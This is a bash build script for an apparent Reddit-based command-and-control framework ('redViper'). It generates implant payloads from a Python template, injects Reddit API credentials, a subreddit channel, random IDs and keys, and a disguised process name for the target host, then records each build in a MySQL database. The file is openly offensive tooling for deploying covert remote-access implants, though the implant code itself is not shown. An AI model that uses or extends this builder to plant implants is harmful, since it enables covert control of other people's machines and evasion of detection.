#!/bin/bash


### COLOR CODES                                                                   
RESET='\033[0m'                                                                                         
RED='\033[0;31m'                                                                                       
RED_B='\033[1;31m'                                                                                                    
GREEN='\033[0;32m'                                                                                      
GREEN_B='\033[1;32m'                                                                                                                               
YELLOW='\033[0;33m'                                                                                                                                    
YELLOW_B='\033[1;33m'                                                                                     
BLUE='\033[0;34m'                                                                                        
BLUE_B='\033[1;34m'                                     
PURPLE='\033[0;35m'                                                                                      
PURPLE_B='\033[1;35m'                                                                                                                     
CYAN='\033[0;36m'                                                                   
CYAN_B='\033[1;36m'                        
WHITE='\033[0;37m'                          
WHITE_B='\033[1;37m'                                                                                                      
GRAY_B='\033[1;37m'
UND='\033[4m'
                                                                                                                                    
YELLOW_EX="${YELLOW_B}[!]${RESET}"
GREEN_PLUS="${GREEN_B}[+]${RESET}"
RED_MINUS="${RED_B}[-]${RESET}"
BLUE_QUE="${BLUE_B}[?]${RESET}"

BASE_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null 2>&1 && pwd )"
config_file="/etc/redViper/redViperAccounts.cfg"

function buildRandom {

	echo "$(head /dev/urandom | tr -dc A-Z0-9a-z | head -c $1)"

}

function checkSubreddit {

	sub="$1"
	
	configuredSubreddits="$(egrep ".*_SUBS=" $config_file | cut -d "=" -f 2)"
	
	validsub=0
	while read -r line; do
		if [ $(echo "$line" | egrep -c "(,${sub}$|^${sub}$|,${sub},|^${sub},)") -gt 0 ]; then
			validsub=1
		fi
	done <<< "$configuredSubreddits"

	echo "$validsub"

}

function checkAccount {

	acc="$1"
	
	configuredAccounts="$(egrep ".*_USER=" $config_file)"

	validacc=0
	while read -r line; do
		accountname="$(echo "$line" | cut -d "=" -f 2)"
		identifier="$(echo "$line" | cut -d "_" -f 1)"
		if [ "$accountname" == "$acc" ]; then

			# checks if its a master account
			if [ $(egrep -c "reddit-${identifier}-master" $config_file) -gt 0 ]; then
				validacc=2
			else
				validacc=1
			fi

		fi
	done <<< "$configuredAccounts"

	echo "$validacc"

}

function listBuildHistory {
	
	source $config_file 2>/dev/null

	if [ $(systemctl is-active mysql) == "active" ]; then
		query="SELECT * FROM ${MYSQL_DB}.implants;"
		out=$(mysql -h $MYSQL_HOST -u $MYSQL_USER -p$MYSQL_PASS -Bse "${query}" 2>&1)
		if [ $(echo "$out" | grep -c "ERROR 1045") -gt 0 ]; then
			echo -e "${RED_MINUS} mySQL Authentication Issue. Please verify mySQL credentials in your redViper config file are valid."
		else

			echo ""
			while read -r line; do
				db_id=$(echo $line | cut -d " " -f 1)
				implant_id=$(echo $line | cut -d " " -f 2)
				implant_key=$(echo $line | cut -d " " -f 3)
				user=$(echo $line | cut -d " " -f 4)
				subreddit=$(echo $line | cut -d " " -f 5)
				datetime=$(echo $line | cut -d " " -f 6,7)
				
				# quick fix to avoid outputting additionally text that comes from some versions of mysql client.
				if [ "$db_id" != "mysql:" ]; then
				echo -e "${GREEN_PLUS} Entry ${db_id}"
				echo -e "${WHITE_B}Creation Time:${RESET} ${datetime}"
				echo -e "${WHITE_B}Implant ID:${RESET} ${implant_id}"
				echo -e "${WHITE_B}Reddit User:${RESET} ${user}"
				echo -e "${WHITE_B}Subreddit:${RESET} ${subreddit}"
				echo ""
				fi
			
			done <<< "$out"		
		fi

	else
		echo -e "${RED_MINUS} mySQL appears to not be running. Please start the mySQL service."
	fi

}

printusage () {
	echo 
	echo -e "${GRAY_B}Usage:${RESET} redViperBuild -a ${UND}account${RESET} -s ${UND}subreddit${RESET} -o ${UND}output file${RESET} [-p ${UND}process name${RESET}]"
	echo
	echo -e "-h | --help)           Display this help page."
	echo -e "-a | --account)        The username of the reddit account you want to hook to the implant. ${WHITE_B}(REQUIRED)${RESET}"
	echo -e "-s | --subreddit)      The name of the subreddit you want to hook to the implant. ${WHITE_B}(REQUIRED)${RESET}"
	echo -e "-o | --outfile)        Name of the file to output implant to. ${WHITE_B}(REQUIRED)${RESET}"
	echo -e "-p | --proctitle)      Specifies the name to set the python process to on the target host."
	echo -e "-l | --list-builds)    Display information on all implants you have built."
	echo
}

if [ -z "$1" ]; then
	printusage
	exit 0
fi

## Command line option parsing

while [[ $# -gt 0 ]]; do

	key="$1"

	case $key in

		-h|--help)
			printusage
			exit 0
			shift
			;;

		-l|--list-builds)
			listBuildHistory
			exit 0
			shift
			;;

		-s|--subreddit)
			isvalid=$(checkSubreddit "$2")
			if [ $isvalid -eq 1 ]; then
				subreddit="$2"
			else
				echo -e "${RED_MINUS} Specified subreddit has not been configured. Please specify a valid subreddit, or add the specified one to your configuration."
				exit 1	
			fi
			shift
			shift
			;;

		-a|--account)
			isvalid=$(checkAccount "$2")
			if [ $isvalid -eq 1 ]; then
				account="$2"
			elif [ $isvalid -eq 2 ]; then
				echo -e "${YELLOW_EX} You've attempted to hook a MASTER account to a deployable payload. This is VERY dangerous."
				echo -en "${BLUE_QUE} Are you sure you want to do this? (y/n): "
				read verify
				if [ "$verify" == "y" ] || [ "$verify" == "Y" ] || [ "$verify" == "yes" ]; then
					account="$2"
				elif [ "$verify" == "n" ] || [ "$verify" == "N" ] || [ "$verify" == "no" ]; then
					echo -e "${RED_MINUS} Exiting . . ."
					exit 1
				else
					echo -e "${RED_MINUS} Invalid selection. Exiting . . ."
					exit 1
				fi

			else
				echo -e "${RED_MINUS} Specified account has not been configured. Please specify a valid account, or add the specified one to your configuration."
				exit 1		
			fi	
			shift
			shift
			;;

		-p|--proctitle)
			proctitle="$2"
			shift
			shift
			;;

		-o|--outfile)
			OUTFILE="$2"
			shift
			shift
			;;

		*)
			echo -e "${RED_MINUS} Invalid option(s) set."
			printusage
			exit 1
			;;
	esac
done

missingInfo=0
if [ -z "$subreddit" ]; then
			echo -e "${RED_MINUS} A configured subreddit must be specified with the ${WHITE_B}-s${RESET} option."
			missingInfo=1
fi

if [ -z "$account" ]; then
			echo -e "${RED_MINUS} A configured account must be specified with the ${WHITE_B}-a${RESET} option."
			missingInfo=1
fi

if [ -z "$OUTFILE" ]; then
			echo -e "${RED_MINUS} An output file must be specified with the ${WHITE_B}-o${RESET} option."
			missingInfo=1
fi

if [ $missingInfo -eq 1 ]; then
	printusage
	exit 1
fi


if [ $(systemctl is-active mysql) == "inactive" ]; then
		echo -e "${RED_MINUS} mySQL appears to not be running. Please start the mySQL service."
		exit 1
fi


echo -e "${GREEN_PLUS} Options look good. Building payload . . ."
/bin/cp ${BASE_DIR}/../src/implant/implant.py $OUTFILE

randImplantKey=$(buildRandom 32)
randImplantID=$(buildRandom $((13 + $RANDOM % 21)))

# push implant info into implant code
sed -i "s/#IMPLANT_ID/\"${randImplantID}\"/g" $OUTFILE
sed -i "s/#IMPLANT_KEY/\"${randImplantKey}\"/g" $OUTFILE

# push implant info into implant db
source $config_file 2>/dev/null

query="INSERT INTO ${MYSQL_DB}.implants ( implant_id, implant_key, reddit_account, subreddit )"
query="${query} VALUES ( \"${randImplantID}\", \"${randImplantKey}\", \"${account}\", \"${subreddit}\" );"
mysql -h $MYSQL_HOST -u $MYSQL_USER -p$MYSQL_PASS -Bse "${query}" > /dev/null 2>&1

#push reddit creds into implant code
accid="$( egrep ".*_USER=${account}" $config_file | cut -d "_" -f 1)"
reddit_pass="$( grep "${accid}_PASS=" $config_file | cut -d "=" -f 2)"
reddit_secret="$( grep "${accid}_SECRET=" $config_file | cut -d "=" -f 2)"
reddit_client="$( grep "${accid}_CLIENT=" $config_file | cut -d "=" -f 2)"
reddit_ua="$(buildRandom $(($RANDOM % 41)))"
sed -i "s/#USER/\"${account}\"/g" $OUTFILE
sed -i "s/#PASSWORD/\"${reddit_pass}\"/g" $OUTFILE
sed -i "s/#SECRET/\"${reddit_secret}\"/g" $OUTFILE
sed -i "s/#CLIENT_ID/\"${reddit_client}\"/g" $OUTFILE
sed -i "s/#AGENT/\"${reddit_ua}\"/g" $OUTFILE

#push subreddit into implant code
sed -i "s/#SUBREDDIT/\"${subreddit}\"/g" $OUTFILE

#set proctitle
if [ -z "$proctitle" ]; then
	proctitle=$(buildRandom $((7 + $RANDOM % 13)))
fi
sed -i "s/#PROC_NAME/\"${proctitle}\"/g" $OUTFILE

echo ""
echo -e "${GREEN_PLUS} Build complete!"
echo "------------------------------------------"
echo -e "${WHITE_B}     Build Info ${RESET}"
echo "------------------------------------------"
echo -e "${WHITE_B}Implant ID:${RESET} ${randImplantID}"
echo -e "${WHITE_B}Account:${RESET} ${account}"
echo -e "${WHITE_B}Subreddit:${RESET} ${subreddit}"
echo -e "${WHITE_B}Filename:${RESET} ${OUTFILE}" 
echo ""
exit 0
